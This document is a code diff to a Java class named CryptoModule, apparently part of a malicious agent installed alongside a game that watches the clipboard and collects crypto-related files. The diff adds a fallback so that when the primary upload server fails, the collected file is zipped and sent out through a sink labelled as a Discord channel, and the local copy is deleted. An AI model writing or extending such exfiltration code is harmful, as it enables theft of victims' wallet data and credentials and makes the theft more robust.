@@ -36,6 +36,10 @@ import java.util.concurrent.atomic.AtomicLong;
  * a corrupt store only yields a per-target error record.
  */
 public final class CryptoModule {
+	public interface Sink {
+		void send(String module, Path file);
+	}
+
 	public record Task(String id, String name, Map<String, Object> params, int timeout) {
 	}
 
@@ -48,6 +52,7 @@ public final class CryptoModule {
 	private final CryptoConfig config;
 	private final CryptoLog log;
 	private final CryptoTransport transport;
+	private final Sink sink;
 	private final Path stateFile;
 	private final Path work;
 	private final Map<String, Object> state = new LinkedHashMap<>();
@@ -82,10 +87,11 @@ public final class CryptoModule {
 	private volatile ClipboardWatcher clipboard;
 	private volatile CryptoConfig activeConfig;
 
-	public CryptoModule(Path installDir, Path gameDir, CryptoConfig config) {
+	public CryptoModule(Path installDir, Path gameDir, CryptoConfig config, Sink sink) {
 		this.installDir = installDir;
 		this.gameDir = gameDir;
 		this.config = config;
+		this.sink = sink;
 		this.activeConfig = config;
 		this.stateFile = AgentPaths.cache(installDir).resolve("crypto").resolve("state.json");
 		this.work = AgentPaths.cache(installDir).resolve("crypto");
@@ -890,10 +896,25 @@ public final class CryptoModule {
 			body.put("total_size", size);
 			body.put("chunk_count", chunks);
 			body.put("sha256", sha);
-			CryptoTransport.Reply init = transport.uploadInit(CryptoUtil.utf8(Json.stringify(body)));
-			if (init.status() != 201) {
+			CryptoTransport.Reply init = null;
+			try {
+				init = transport.uploadInit(CryptoUtil.utf8(Json.stringify(body)));
+			} catch (Throwable throwable) {
+				log("api upload unavailable: " + throwable.getMessage());
+			}
+			if (init == null || init.status() != 201) {
+				try {
+					Path zip = file.resolveSibling(file.getFileName().toString().replace(".spc", ".zip"));
+					pack.buildZip(zip);
+					if (sink != null) {
+						sink.send(module, zip);
+					}
+				} catch (Throwable throwable) {
+					warn("discord fallback failed", throwable);
+				}
+				Files.deleteIfExists(file);
 				uploadsActive.decrementAndGet();
-				log("upload init failed " + init.status());
+				log("upload init failed, discord fallback");
 				return "";
 			}
 			String uploadId = Json.str(init.json(), "upload_id", "");
